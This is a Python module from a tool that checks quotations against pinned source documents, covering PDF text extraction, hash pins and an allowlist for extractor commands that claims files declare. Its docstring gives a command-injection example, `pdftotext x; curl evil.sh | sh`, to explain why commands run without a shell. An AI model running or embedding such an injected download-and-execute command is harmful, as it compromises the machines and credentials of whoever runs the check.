"""Does each quotation appear in the source it cites?

Builds a corpus of quotations checked against a pinned source, so later work quotes from the
corpus rather than from memory.

Three orthogonal things, kept apart.

The pin -- is this the document that was pinned? Checked once per artifact:

    ok           the file's sha256 matches the one recorded
    broken       the file has changed since the quotations were taken
    unpinned     no sha256 was recorded, so nothing can be checked
    missing      the file named by the record is not on disk

The result -- did the passage appear? Exhaustive, four outcomes:

    found          the passage is in the source
    not found      the source was read and the passage is not in it
    indeterminate  extractors that both read the source disagree about whether it is in it
    unchecked      nothing could read the source, so no measurement was made

The warnings -- is the quote well formed? A quote can be `found` and still carry one:

    short        the source may qualify it in the next clause
    truncated    every occurrence stops mid-word or mid-number
    normalized   matched only after ignoring punctuation and spacing
    page         found, but not on the page the record claims

The extractor -- what turned the source into text? Recorded on every result, with a digest of
what it produced. A pin says the bytes did not change and says nothing about how they were
read: two extractors over one PDF produce two texts and one pin, so a decision that does not
name the program behind it cannot be compared with a later one. A source declaring
`extract_cmd` is read by the command it names, a `TEXT_SUFFIXES` source straight off disk, and
everything else by `pdftotext -layout` or, where poppler is absent or fails on the document, by
whichever pure-Python reader is installed. That substitution is recorded on the result as a
fallback and its reason: `pip install citations` should be able to check a PDF, and a result
that quietly rests on a different extractor than the one it names is worse than no result.

A declared command does not join that chain. An author naming a renderer has said which
program produces the text they quote, so it runs or the check is `unchecked` with its reason;
falling through to a PDF reader would run one over a source whose author just said is not a
PDF, and record an extractor nobody asked for.

`indeterminate` is not a milder `not found`. `not found` says the source was read and the
passage is not in it, which is an accusation against the manuscript. `indeterminate` says the
extractors on this machine do not settle what text the document holds, which accuses nothing
and asks for a better reader. Against the three-stage model in `docs/SPEC.md` the two sit in
different stages: `not found` is `extraction=extracted, comparison=mismatch`, while
`indeterminate` is `extraction=invalid, comparison=not_applicable` -- the extractors ran, and
what they produced does not determine a text to compare against. It is reached only under
`--triangulate`, which asks every installed reader instead of one; a single extractor cannot
disagree with itself, and a declared command is a single extractor.

`unchecked` means read the source. A mirror-reversed scan or a broken extraction produces the
same signal as a passage that was never there -- so an extraction that failed for an
infrastructure reason says which one, rather than reporting the document as unreadable.

Running a declared `extract_cmd`
--------------------------------

The command a claims file declares runs on the machine doing the checking. The case that
decides the rules is not an author running their own file: it is `citations verify` in
continuous integration on a pull request from a fork, where the contributor wrote the claims
file and the command executes on the maintainer's runner with the runner's environment and
credentials in reach. Two measures bound that, and neither is a sanitizer:

    no shell     the declared string is split into a program and arguments and executed
                 directly. `pdftotext x; curl evil.sh | sh` is not filtered out, it cannot be
                 expressed -- the `;` and the `|` reach pdftotext as literal arguments.
    an allowlist only `DEFAULT_EXTRACTORS` runs unasked. Anything else needs
                 `--allow-extractor NAME`, written by whoever runs the check rather than by
                 whoever wrote the claims file.

A refused command is `unchecked` and says it was refused; a command that is not installed is
`unchecked` and says that instead. The remedy for one is consent and for the other an install,
and neither makes the passage absent.

The allowlist bounds which program runs and not what an allowed program can be told to do, so
a program that loads and runs code named on its own command line stays out of the default set.
`pandoc --lua-filter` and `mutool run` are both arbitrary execution, and reaching either is a
deliberate act with the consequence in view.
"""

from __future__ import annotations

import functools
import hashlib
import pathlib
import re
import shlex
import shutil
import subprocess
import unicodedata
from collections.abc import Callable
from dataclasses import dataclass, field
from typing import Literal

from provenance_core import sha256_of_file

from citations import readers
from citations.exceptions import SourceUnreadableError

# Long enough to carry its own qualifiers. "We trained 50" resolves against a sentence that
# continues "...and 5 refits each for 12 layered".
MIN_QUOTE_CHARS = 40

#: How many pages `_find_page` will scan before giving up. Hitting it is reported, never
#: silently folded into "not found on any page" -- the two are different facts.
PAGE_SCAN_LIMIT = 200

#: Suffixes read directly rather than through a PDF extractor. Running `pdftotext` over these
#: returns nothing, which would read as an unreadable source.
TEXT_SUFFIXES = (".txt", ".md", ".tei", ".xml", ".html", ".htm", ".rst")

#: Recorded as the extractor for a source read straight off disk. Naming a program there would
#: claim one ran.
PLAIN_TEXT = "text"

#: What reads a source that declares no `extract_cmd` and is not plain text, where poppler is
#: installed and can read it. Also the name the report gives that reading.
DEFAULT_EXTRACTOR = "pdftotext -layout"

#: The same binary with `-layout` removed, so it emits poppler's reading order rather than the
#: page's geometry. Not in the chain: `-layout` always reads a PDF poppler can open, so nothing
#: would ever reach this. It is a triangulation participant, because the two modes fail in
#: opposite directions -- `-layout` preserves visual position and breaks a sentence spanning
#: two columns, reading order preserves the sentence and misplaces the subscripts beside it.
#: Measured over 1,593 passage checks in `research/pdf-readers/`: reading order resolved 59 the
#: layout mode missed and missed 29 it resolved, so neither is preferred and both are read.
READING_ORDER = "pdftotext"

#: Recorded as the extractor when a caller replaced `extract`. Naming the substitution keeps
#: the promise the rest of this module makes: a result says what produced the text it was
#: checked against, and "a stub did" is an answer where inventing an extractor name is not.
SUBSTITUTED = "substituted"

#: The word a claims file uses to say "this source needs no extractor".
#: `paperclip.source_block` writes it for a pinned text artifact, on the reasoning that naming
#: an extractor would claim a step that never ran -- and `_argv` then read it as a program
#: called `none` and refused it, so every source the resolver wrote came back `unchecked`,
#: advising the reader to `--allow-extractor none` and run a program that does not exist.
NO_EXTRACTOR = "none"


def declared_extractor(extract_cmd: str | None) -> str | None:
    """The command a source declares, or None where it declares that it needs none.

    Applied wherever an `extract_cmd` arrives from a file, so the rest of the module sees one
    representation of "no extractor" rather than several.

    Matched on the first word, because authors write the reason beside it -- `none -- Markdown
    is read directly` is in this project's own claim set, and reading that as a command named
    `none` is how it was found. Nothing is guessed from the rest of the line: a value whose
    first word is anything else is a command, and is run or refused as one. A real program
    named `none` would be read as this declaration instead, which is the one case this trades
    away and it does not occur.
    """
    if extract_cmd is None or not (words := extract_cmd.split()):
        return None
    return None if words[0].strip().lower() == NO_EXTRACTOR else extract_cmd


#: How long any extractor gets before the source is reported unreadable rather than waited on.
EXTRACT_TIMEOUT = 120

#: Programs an `extract_cmd` may name with no further consent. Each reads a file and prints
#: text, and neither can be told on its own command line to load and run code. Matched against
#: the program as written, so `pdftotext` is allowed and `./pdftotext` is not: a bare name
#: resolves through PATH, which the machine running the check controls and a claims file
#: arriving from elsewhere does not.
DEFAULT_EXTRACTORS = frozenset({"pdftotext", "detex"})

State = Literal["found", "not found", "ambiguous", "indeterminate", "unchecked"]
PinState = Literal["ok", "broken", "unpinned", "missing"]


@dataclass
class Result:
    """`state` is the measurement; `warnings` are notes about the quote itself."""

    state: State
    detail: str = ""  # why, when unchecked or not found
    warnings: list[str] = field(default_factory=list)
    page_found: int | None = None

    extractor: str = ""
    """What turned the source into text: the declared `extract_cmd`, `pdftotext -layout`, or
    `text` for a source read straight off disk. Empty where nothing was read, so a decision
    resting on an extractor stays distinguishable from one that rests on none."""

    extraction_digest: str = ""
    """sha256 of the text the extractor produced. The artifact's pin establishes that the
    bytes did not change; this establishes that the reading of them did not, which a pin
    cannot -- two extractors over one PDF produce two texts under one pin."""

    fallback: bool = False
    """Whether something other than `pdftotext -layout` produced this text on a source that
    declared no command. A substitution is recorded, never silent: a `not found` taken with
    pypdf is a different record from one taken with poppler."""

    fallback_reason: str = ""
    """Why poppler did not produce it -- not installed, or failed on this file."""

    agreement: dict[str, State] = field(default_factory=dict)
    """Each extractor's own verdict, when more than one was consulted. Empty on the default
    single-extractor check: an empty mapping means agreement was never measured, not that the
    extractors agreed. Availability and agreement are different questions and this field
    answers only the second."""


@dataclass
class Pin:
    """Whether the artifact on disk is the artifact the record describes.

    Separate from `Result` because it is a fact about the source, not about any one quotation.
    A broken pin does not make a quotation `not found` -- the passage may well be in the file
    that is there -- but it does mean every result computed against it describes a document
    the record does not.
    """

    state: PinState
    expected: str = ""
    actual: str = ""

    @property
    def ok(self) -> bool:
        return self.state == "ok"


@dataclass
class Report:
    checked: int = 0
    counts: dict[str, int] = field(default_factory=dict)
    problems: list[tuple[str, str, Result]] = field(default_factory=list)
    broken_pins: list[tuple[str, Pin]] = field(default_factory=list)
    unpinned: list[str] = field(default_factory=list)
    """Sources with no recorded digest. Their quotations resolve against whatever is on disk."""
    skipped: list[tuple[str, str]] = field(default_factory=list)
    """Claims files that would not parse, so their quotations were never examined."""
    extractors: dict[str, int] = field(default_factory=dict)
    """How many quotations each extractor answered. A report that does not say what read its
    sources cannot be compared with one taken where a different renderer was declared."""

    fallback_reasons: dict[str, str] = field(default_factory=dict)
    """Why poppler did not answer, for each extractor that stood in for it. A fallback appears
    here whether it was taken because poppler was absent or because poppler failed, so no
    substitution is invisible in the report."""

    triangulated: int = 0
    """Quotations more than one extractor was asked about. Counted rather than inferred from
    `--triangulate`: a run can ask for triangulation and get none, where every source declares
    a command or only one reader is installed, and reporting the request as the result would
    claim an agreement nothing measured."""

    @property
    def unresolved(self) -> int:
        """Quotations no verdict was reached on.

        `indeterminate` counts here and not among the failures. Extractors disagreeing about a
        passage leaves the question open in exactly the way an absent one does; what it does
        not do is assert that the passage is missing.
        """
        return (
            self.counts.get("unchecked", 0)
            + self.counts.get("indeterminate", 0)
            + self.counts.get("ambiguous", 0)
        )

    @property
    def strict_ok(self) -> bool:
        """What `--strict` means: nothing was left unresolved.

        `ok` is the substantive verdict -- a quotation that is genuinely absent. It
        deliberately ignores an unchecked quote, because a missing extractor says nothing
        about the paper. For CI that is the wrong question: a deleted source, an unpinned
        one, a claims file that would not parse, and a missing `pdftotext` all left a build
        green while nothing had been verified at all.
        """
        return self.ok and not self.unresolved and not self.unpinned and not self.skipped

    @property
    def ok(self) -> bool:
        """Only `not found` and a broken pin are failures. Unchecked and indeterminate are not.

        A run that measured nothing is not a pass, decided here so no caller can report
        success on an empty run.

        `indeterminate` is deliberately not a failure. Two extractors disagreeing about a
        passage says the document is not determinate under the readers on this machine;
        treating that as a quotation failure would fail a manuscript for a property of the
        reader. `--strict` still refuses it, through `unresolved`.
        """
        if self.checked == 0:
            return False
        if self.broken_pins:
            return False
        return not any(r.state == "not found" for _, _, r in self.problems)


@functools.lru_cache(maxsize=256)
def fold(s: str) -> str:
    """Normalize the way a PDF extractor mangles text, without changing which words appear."""
    # NFKD and not NFKC, then the combining marks dropped. A renderer typesets `naïve` as a
    # dotless i carrying a combining diaeresis, which is how LaTeX writes it, and the quotation
    # is typed with the precomposed `ï`. Composing leaves those two different strings and the
    # passage reads as absent: seven quotations from one paper failed on that alone. Dropping
    # the marks makes both sides `naive`, at the cost of no longer distinguishing two words
    # that differ only by an accent -- which is a pair that does not occur inside one document.
    # NFKD folds the `ﬁ` and `ﬂ` ligatures the same as NFKC does.
    s = unicodedata.normalize("NFKD", s)
    s = "".join(c for c in s if not unicodedata.combining(c))
    # A PDF's embedded fonts can reach the extractor as raw glyph codes, arriving as control
    # characters mid-page. They become separators rather than being deleted: deleting them welds
    # the words on either side into one that appears in neither text, so a passage that is really
    # there stops resolving. `logit\x00difference` deleted is `logitdifference`, which no honest
    # quotation of it can match.
    s = re.sub(r"[\x00-\x08\x0b\x0e-\x1f\x7f]", " ", s)
    s = s.replace("’", "'").replace("‘", "'")
    s = s.replace("“", '"').replace("”", '"')
    # Em dash, en dash, minus sign, and U+2010 HYPHEN. The last is the one that gets missed:
    # it is visually identical to the ASCII hyphen and publishers emit it, so a source reading
    # `patients\u2010in\u2010waiting` did not match a quotation typed with the ASCII one, and the
    # passage read as absent from a document that contains it.
    s = s.replace("—", "-").replace("–", "-").replace("−", "-").replace("‐", "-")
    # Dotless i and dotted capital I are letters in their own right, not compatibility forms,
    # so no normalization reaches them: NFKC and NFKD both leave `ı` exactly as it was. A PDF
    # that renders `Krzyżosiak` through a font substituting the dotless glyph extracts a word
    # no honest quotation of it can match, and the passage reads as absent from a document
    # that contains it. The ligatures need no entry here -- NFKC folds `ﬁ` to `fi` already.
    s = s.replace("ı", "i").replace("İ", "I")
    s = re.sub(r"-\s*\n\s*", "", s)  # de-hyphenate across a line break
    return " ".join(s.split()).lower()


@functools.lru_cache(maxsize=256)
def skeleton(s: str) -> str:
    """`fold`, with whitespace removed. Nothing else.

    This is the fallback used when a verbatim match fails, so it is only ever applied to a
    passage that is provably not in the source as written. It must therefore absorb exactly
    what a PDF extractor mangles and nothing more.

    Extractors insert and drop spaces inside words -- `logit difference` comes out as
    `logitdifference` -- so whitespace is removed. They do not turn `=` into `<`, delete a
    minus sign, or drop a decimal point. An earlier version stripped every non-alphanumeric
    character, which made `p < 0.05` match a source reading `p = 0.05`, and `-0.42` match
    `0.42`: a reversed inequality and a flipped sign both reported as quoted verbatim, by the
    one check that exists to catch a misquotation.
    """
    s = fold(s)
    # A hyphen joining two word characters, at least one of them a letter, with any whitespace
    # after it. A renderer breaks `prefix-matching` across a line, `fold` removes the break
    # hyphen from the document, and the quotation keeps the real one, so the two can never
    # agree while a hyphen means anything here. The trailing `\s*` is for the mirror case,
    # where the quotation preserved the break and the document did not: `non- sparse` against
    # `nonsparse`.
    #
    # The bounds are the point. Deleting every hyphen is a live defect -- it folds `-0.42`
    # into `0.42`, so a quotation claiming the negative resolves against a source stating the
    # positive -- and this is what stops that: a minus sign is preceded by a space or by
    # nothing, never by a word character, so no rule here reaches one. Nor does it reach the
    # subtraction in `vec('king') - vec('man')`, which is spaced on both sides and stays a
    # mismatch when a document's extraction has dropped it. Requiring a letter on one side
    # leaves `5-3` alone, where a range and a subtraction look identical.
    s = re.sub(r"(?<=[a-z])-\s*(?=[a-z0-9])|(?<=[a-z0-9])-\s*(?=[a-z])", "", s)
    # An underscore is a subscript the extractor has already flattened: `p_{IOI}` comes out as
    # `pioi`, and the quotation is typed with the underscore the source no longer shows.
    s = s.replace("_", "")
    return re.sub(r"\s+", "", s)


def _argv(source: pathlib.Path, declared: str, allowed: frozenset[str]) -> list[str]:
    """A declared `extract_cmd` as argv, with the source path substituted in.

    `{}` is replaced by the path wherever it appears, and a command carrying no `{}` gets the
    path appended, so `detex` and `pdftotext -layout {} -` both name a working extractor.

    Refuses a command that will not parse into a program and arguments, and one naming a
    program this run was not told to allow. Both raise `SourceUnreadableError`, so both reach
    the report as `unchecked` with the reason: nothing was read, and the passage is not
    thereby absent. The module docstring says why the check is an allowlist over argv rather
    than a filter over a string.
    """
    try:
        parts = shlex.split(declared)
    except ValueError as e:
        raise SourceUnreadableError(source, f"extract_cmd will not parse as a command: {e}") from e
    if not parts:
        raise SourceUnreadableError(source, "extract_cmd is empty")
    if parts[0] not in allowed:
        raise SourceUnreadableError(
            source,
            f"extract_cmd names {parts[0]!r}, which this run does not allow -- "
            f"pass --allow-extractor {parts[0]} to run it",
        )
    if any("{}" in part for part in parts):
        return [part.replace("{}", str(source)) for part in parts]
    return [*parts, str(source)]


def _stem_siblings(source: pathlib.Path) -> frozenset[str]:
    """Files beside `source` sharing its stem, which is where a writing extractor puts output.

    Narrowed to the stem rather than the whole directory on purpose. `pdftotext -layout X.pdf`
    writes `X.txt`, which is the observed case; watching every name in the directory would also
    fire when an unrelated process writes there, and this project routinely has more than one
    session working in one tree.
    """
    try:
        return frozenset(
            q.name for q in source.parent.iterdir() if q.stem == source.stem and q != source
        )
    except OSError:
        return frozenset()


def _run(source: pathlib.Path, argv: list[str], missing: str = "", hint: str = "") -> str:
    """Run one extractor over `source` and return what it printed.

    Never through a shell: `subprocess.run` is handed a list, so a metacharacter in a declared
    command is an argument to the program rather than an operator interpreted before it.

    Every way the toolchain can fail raises `SourceUnreadableError` naming which way, rather
    than returning empty text. An empty return means the document holds no extractable text,
    which is a fact about the document and carries a different message.
    """
    program = argv[0]
    # The bytes before the command runs. A declared extractor is an arbitrary program given a
    # path, and nothing stops it writing where it read: a renderer whose output filename
    # matched its input overwrote the artifact it was pointed at, and the pin then failed
    # against a file the checker itself had damaged. Recovering it needed version control.
    # `verify` reads and never writes, so an extractor that writes is a defect to report.
    # `sha256_of_file` and not the memoized `sha256` beside it: the point is to read the
    # bytes twice and compare, and a cache keyed on the path returns the first answer both
    # times, which would make this check incapable of failing.
    before = sha256_of_file(source) if source.is_file() else ""
    # The same rule one level out. The hash above catches an extractor that overwrites the file
    # it was given; it cannot see one that writes a *sibling*, and that is the common shape:
    # `pdftotext -layout X.pdf` with no `-` writes `X.txt` and prints nothing. Thirty-two such
    # files accumulated in one audited repository over three weeks, unnoticed because the
    # directory is gitignored. Nothing was corrupted there, but a `.txt` pinned as a source
    # beside a same-stem PDF would have been silently replaced by this tool's own output.
    beside = _stem_siblings(source)
    try:
        proc = subprocess.run(argv, capture_output=True, text=True, timeout=EXTRACT_TIMEOUT)
    except FileNotFoundError as e:
        raise SourceUnreadableError(source, (missing or f"{program} is not on PATH") + hint) from e
    except subprocess.TimeoutExpired as e:
        raise SourceUnreadableError(source, f"{program} timed out after {EXTRACT_TIMEOUT}s") from e
    except OSError as e:
        raise SourceUnreadableError(source, f"{program} could not be run: {e}") from e
    if before and (after := sha256_of_file(source)) != before:
        raise SourceUnreadableError(
            source,
            f"{program} modified the artifact it was given ({before[:12]} -> {after[:12]}). "
            f"An extractor reads; one that writes has damaged the bytes the pin names, and "
            f"the file on disk is no longer the one that was checked. Restore it before "
            f"re-running. A command whose output path collides with its input does this: "
            f"give the output a distinct name, or write to stdout.",
        )
    if left := sorted(_stem_siblings(source) - beside):
        raise SourceUnreadableError(
            source,
            f"{program} wrote {', '.join(left)} beside the source. An extractor reads; one "
            f"that writes has changed the tree it was pointed at, and a file it leaves under "
            f"a name another record pins would replace that record's source with this tool's "
            f"own output. Send the text to stdout instead: `{program} ... {{}} -`. The file it "
            f"wrote is still there; nothing here deletes it.",
        )
    if proc.returncode != 0:
        said = (proc.stderr or "").strip().splitlines()
        raise SourceUnreadableError(
            source,
            f"{program} exited {proc.returncode}" + (f": {said[-1]}" if said else "") + hint,
        )
    if not proc.stdout.strip():
        # An empty stdout from a *declared* command is not the same fact as a document with no
        # text, and the two carried one message. `pdftotext FILE` writes FILE.txt and prints
        # nothing; a reader told "no text extracted" goes looking at the document.
        advice = (
            "  (pdftotext writes to a file unless the last argument is `-`: "
            "declare `pdftotext -layout {} -`)"
            if pathlib.Path(program).name == "pdftotext" and "-" not in argv[1:]
            else "  (the command ran and exited 0; its output goes to stdout, "
            "so a command that writes a file prints nothing here)"
        )
        raise SourceUnreadableError(source, f"{program} printed nothing" + advice + hint)
    return proc.stdout


def _hint(pdf: pathlib.Path) -> str:
    """What to say when a PDF reader was pointed at something that is not a PDF.

    A `.tex` handed to one answers `Syntax Error: Couldn't read xref table`, which reads as a
    damaged document rather than as the wrong tool pointed at an intact one.
    """
    if pdf.suffix.lower() in ("", ".pdf"):
        return ""
    return f"  ({pdf.suffix} is not a PDF: declare extract_cmd to name the renderer)"


def _poppler(pdf: pathlib.Path, page: int | None, layout: bool = True) -> str:
    """`pdftotext` over a source, or one page of it, with or without `-layout`."""
    cmd = ["pdftotext", "-layout"] if layout else ["pdftotext"]
    if page:
        cmd += ["-f", str(page), "-l", str(page)]
    cmd += [str(pdf), "-"]
    return _run(pdf, cmd, "pdftotext is not on PATH -- install poppler-utils")


def _chain(pdf: pathlib.Path, page: int | None) -> readers.Extraction:
    """The first extractor that reads this source, and what it took to get there.

    Poppler is attempted rather than looked up on PATH first. The two answers agree wherever
    it matters -- an absent binary raises `FileNotFoundError` when run -- and attempting it
    keeps one code path, so a caller that replaced `subprocess.run` sees the extractor it
    replaced rather than a chain that decided in advance not to call it.

    A reader that is not installed contributes its reason without being run, because its
    absence is an import-time fact and no attempt could tell us more. Every reason is kept:
    "nothing could read this" is only useful with what each of them said.
    """
    reasons: list[str] = []
    try:
        return readers.Extraction(_poppler(pdf, page), DEFAULT_EXTRACTOR)
    except SourceUnreadableError as e:
        reasons.append(e.detail)
    for name in readers.PREFERRED:
        try:
            text = readers.READERS[name].read(pdf, page)
        except SourceUnreadableError as e:
            reasons.append(e.detail)
            continue
        return readers.Extraction(text, name, fallback=True, fallback_reason="; ".join(reasons))
    raise SourceUnreadableError(pdf, "; ".join(reasons) + _hint(pdf))


#: What produced each extraction, keyed exactly as `extract` is keyed and holding no text.
#: `reading` reads it back to name the extractor without extracting a second time, and an
#: entry that is not here means `extract` was replaced by a caller -- the one case where the
#: text did not come from an extractor this module ran. Cleared with the cache beside it.
_PROVENANCE: dict[tuple, tuple[str, bool, str]] = {}


def _extract(
    pdf: pathlib.Path,
    page: int | None,
    extract_cmd: str | None,
    allowed: frozenset[str],
) -> readers.Extraction:
    """The extraction itself, and what produced it.

    A declared `extract_cmd` takes precedence over both other paths, including reading a
    `TEXT_SUFFIXES` file directly: an author names a renderer because the bytes on disk are
    not the text they quote. It renders the whole document at once, so `page` does not reach
    it, `allowed` decides which programs this run will run, and it never falls through to the
    chain -- a named renderer that failed is a fact to report, not a reason to run something
    else and record its name instead.
    """
    if extract_cmd:
        argv = _argv(pdf, extract_cmd, allowed)
        return readers.Extraction(_run(pdf, argv), _extractor_name(pdf, extract_cmd))
    if pdf.suffix.lower() in TEXT_SUFFIXES:
        try:
            return readers.Extraction(pdf.read_text(errors="replace"), PLAIN_TEXT)
        except OSError as e:
            raise SourceUnreadableError(pdf, f"could not be read: {e}") from e
    return _chain(pdf, page)


@functools.lru_cache(maxsize=64)
def _extraction(
    pdf: pathlib.Path,
    page: int | None,
    extract_cmd: str | None,
    allowed: frozenset[str],
) -> tuple[readers.Extraction | None, SourceUnreadableError | None]:
    """One attempt at reading a source, memoized whether or not it succeeded.

    `functools.lru_cache` stores a value only on a normal return, so a cache around a function
    that raises memoizes nothing at all. `extract` raises on a source it cannot read, so every
    quotation against an unreadable document re-ran the extractor: measured at 2,210 poppler
    invocations for 14 unique artifacts, 158 times the work the corpus requires, and 95% of a
    21-minute run. The failure is per-document and does not become a different failure on the
    second quotation, so it is cached like any other answer.

    Returned as a pair rather than raised here, because the raising is `extract`'s contract and
    callers depend on it.
    """
    try:
        return _extract(pdf, page, declared_extractor(extract_cmd), allowed), None
    except SourceUnreadableError as e:
        return None, e


def extract(
    pdf: pathlib.Path,
    page: int | None = None,
    extract_cmd: str | None = None,
    allowed: frozenset[str] = DEFAULT_EXTRACTORS,
) -> str:
    """Text of a source, and the one seam every comparison reads through. Cached, so N quotes
    against one file is one extraction.

    Exported, and stood in for by callers outside this package: `repro`'s quote backend calls
    `check_one`, and its regression suite replaces this function so a test can fix what a
    document says on each page. Everything that compares a passage against a document takes
    its text from here for that reason -- an extractor chain that went around it would leave
    those stubs measuring the stand-in bytes on disk, and a wrong-page misquote would grade
    `unchecked` rather than `mismatch`, which `publication` warns on rather than fails.

    Raises `SourceUnreadableError` when the extraction toolchain is at fault -- a missing or
    refused command, a timeout, a permission error, nothing installed that can read a PDF --
    rather than returning empty text. An empty return means the document genuinely holds no
    extractable text on that page, which is a different fact and gets a different message.
    """
    got, failed = _extraction(pdf, page, extract_cmd, allowed)
    if failed is not None:
        raise failed
    assert got is not None
    _PROVENANCE[(pdf, page, extract_cmd, allowed)] = (
        got.extractor,
        got.fallback,
        got.fallback_reason,
    )
    return got.text


def reading(
    pdf: pathlib.Path,
    page: int | None = None,
    extract_cmd: str | None = None,
    allowed: frozenset[str] = DEFAULT_EXTRACTORS,
) -> readers.Extraction:
    """Text and what produced it, with the text taken from `extract`.

    The provenance is read back from the table `extract` writes, so naming the extractor costs
    no second extraction. An entry that is not there means `extract` returned text no
    extractor here produced, because a caller replaced it; that text is the caller's and the
    provenance is not this module's to invent, so it is named `substituted` rather than
    guessed at.
    """
    extract_cmd = declared_extractor(extract_cmd)
    text = extract(pdf, None, extract_cmd, allowed) if extract_cmd else extract(pdf, page)
    known = _PROVENANCE.get((pdf, None if extract_cmd else page, extract_cmd, allowed))
    if known is None:
        return readers.Extraction(text, SUBSTITUTED)
    extractor, fallback, reason = known
    return readers.Extraction(text, extractor, fallback, reason)


@functools.lru_cache(maxsize=64)
def _reading_with(
    pdf: pathlib.Path, page: int | None, extractor: str
) -> tuple[readers.Extraction | None, SourceUnreadableError | None]:
    """One named extractor's attempt, memoized either way. See `_extraction`.

    This one matters more than it looks: `_second_opinion` reaches it on every `not found`, so
    a document no reader can open was re-attempted by every reader once per quotation.
    """
    try:
        return _reading_with_uncached(pdf, page, extractor=extractor), None
    except SourceUnreadableError as e:
        return None, e


def reading_with(
    pdf: pathlib.Path, page: int | None = None, *, extractor: str
) -> readers.Extraction:
    """One named extractor's own reading of a source. Triangulation, and nothing else."""
    got, failed = _reading_with(pdf, page, extractor)
    if failed is not None:
        raise failed
    assert got is not None
    return got


def _reading_with_uncached(
    pdf: pathlib.Path, page: int | None = None, *, extractor: str
) -> readers.Extraction:
    """One named extractor's own reading of a source. Triangulation, and nothing else.

    Cached like `extract`, since triangulating N quotations over one document must be one
    extraction per extractor rather than N. This reads the file rather than going through
    `extract`, because the question it answers is what a particular extractor makes of the
    bytes: a caller that replaced `extract` has said what the document contains, which is an
    answer to a different question, and routing it here would make every extractor agree by
    construction.
    """
    if extractor in (DEFAULT_EXTRACTOR, READING_ORDER):
        layout = extractor == DEFAULT_EXTRACTOR
        return readers.Extraction(_poppler(pdf, page, layout), extractor)
    if extractor in readers.READERS:
        return readers.Extraction(readers.READERS[extractor].read(pdf, page), extractor)
    raise SourceUnreadableError(pdf, f"no such extractor: {extractor}")


#: The memoization sits under `extract` and `reading_with` now, so their `cache_clear` and
#: `cache_info` are delegated rather than lost. Both were public: the regression suites call
#: them, and a caller managing the cache should not have to know which function holds it.
extract.cache_clear = _extraction.cache_clear  # type: ignore[attr-defined]
extract.cache_info = _extraction.cache_info  # type: ignore[attr-defined]
reading_with.cache_clear = _reading_with.cache_clear  # type: ignore[attr-defined]
reading_with.cache_info = _reading_with.cache_info  # type: ignore[attr-defined]


def available_extractors() -> list[str]:
    """Which extractors this machine can ask about a PDF, in preference order.

    Used to decide who triangulation consults and what the report says it consulted. The chain
    does not use it: the chain attempts poppler and finds out, while this has to answer without
    running anything.
    """
    poppler = [DEFAULT_EXTRACTOR, READING_ORDER] if shutil.which("pdftotext") else []
    return poppler + readers.available()


@functools.lru_cache(maxsize=64)
def _digest(text: str) -> str:
    """sha256 of what an extractor produced, recorded beside the extractor that produced it."""
    return hashlib.sha256(text.encode()).hexdigest()


def _extractor_name(artifact: pathlib.Path, extract_cmd: str | None) -> str:
    """What `extract` reads this source with, as the report names it."""
    if extract_cmd := declared_extractor(extract_cmd):
        return " ".join(extract_cmd.split())
    return PLAIN_TEXT if artifact.suffix.lower() in TEXT_SUFFIXES else DEFAULT_EXTRACTOR


@functools.lru_cache(maxsize=256)
def sha256(p: pathlib.Path) -> str:
    """Hash of a file on disk. The implementation is shared; this keeps the local name."""
    return sha256_of_file(p)


def clear_caches() -> None:
    """Forget every memoized extraction, folding and digest.

    One call rather than five, because a caller that clears four of them and forgets the fifth
    gets a stale answer that looks like a fresh one.
    """
    for cached in (_extraction, _reading_with, fold, skeleton, _digest, sha256):
        cached.cache_clear()
    _PROVENANCE.clear()


def check_pin(artifact: pathlib.Path | None, expected: str | None) -> Pin:
    """Is the file on disk the file that was pinned?

    An unpinned source is reported as `unpinned`, never as `ok`: no hash was recorded, so
    nothing was checked, and saying otherwise would claim a guarantee the record does not make.
    """
    if artifact is None or not artifact.exists():
        return Pin("missing")
    if not (expected and expected.strip()):
        return Pin("unpinned")
    try:
        actual = sha256(artifact)
    except OSError:
        return Pin("missing")
    expected = expected.strip().lower()
    return Pin("ok" if actual == expected else "broken", expected, actual)


def check_one(
    quote: str,
    artifact: pathlib.Path | None,
    page: int | None = None,
    extract_cmd: str | None = None,
    allowed: frozenset[str] = DEFAULT_EXTRACTORS,
    triangulate: bool = False,
    prefix: str = "",
    suffix: str = "",
) -> Result:
    """Does this passage appear in this source, and what read the source to decide?

    `prefix` and `suffix` are the W3C `TextQuoteSelector` neighbours, consulted only where the
    passage occurs more than once. Both default to empty, so a caller that has never carried
    them gets the verdict it always got on any passage that resolves uniquely.

    `extract_cmd` is the command the claims file declares; `allowed` is the set of programs
    this run will run, which the caller decides rather than the file. A command that is
    refused, missing, failing or silent yields `unchecked` carrying the reason -- none of
    those makes the passage absent.

    One extractor by default. `triangulate` asks every installed reader instead and reports
    `indeterminate` where they disagree, which costs one extraction per reader and is why it
    is not the default. It does not apply to a source that declares a command: there is one
    declared extractor, nothing to disagree with, and `agreement` stays empty rather than
    claiming a comparison nothing performed.
    """
    extract_cmd = declared_extractor(extract_cmd)
    warn: list[str] = []
    text = quote.strip()
    if len(text) < MIN_QUOTE_CHARS or text.endswith(
        (",", " and", " or", " but", " the", " a", " of", " for", " with")
    ):
        warn.append("short")

    if artifact is None or not artifact.exists():
        return Result("unchecked", "file not found", warn)

    if triangulate and not extract_cmd and is_paginated(artifact):
        return _triangulate(quote, artifact, page, warn, prefix, suffix)

    # `extract` is called with the arguments it has always taken where nothing is declared. It
    # is exported, and a caller that wraps or substitutes it wrote against the two-argument
    # shape; a source with no `extract_cmd` must not start reaching them for a new one.
    try:
        got = reading(artifact, None, extract_cmd, allowed) if extract_cmd else reading(artifact)
    except SourceUnreadableError as e:
        return Result("unchecked", e.detail, warn)
    if not got.text.strip():
        return Result("unchecked", "no text extracted", warn)

    # A declared extractor renders the whole document at once, so there is no page to ask it
    # about: the position a `.txt` source is already in. Asking `pdftotext` for the page
    # instead would run a PDF reader over a source whose author said it is not one.
    # A page can be checked only where this module can ask for one page on its own terms, which
    # means no declared command: an arbitrary program has no page flag, and asking `pdftotext`
    # for page 4 of a source whose author declared `detex` would run a PDF reader over something
    # they just said is not a PDF.
    #
    # What that left was silent. A record asserting `page: 3` under a declared `pdftotext
    # -layout` had the assertion dropped and reported nothing: 154 page assertions in one
    # audited claim, and page 9999 on a three-page document graded exactly as page 3 did. An
    # unverifiable assertion is a fact about the check and belongs in the report, so it is a
    # warning now rather than an omission.
    paginated = extract_cmd is None and is_paginated(artifact)
    if page and not paginated and is_paginated(artifact):
        warn.append("page unchecked")
    result = _verdict(
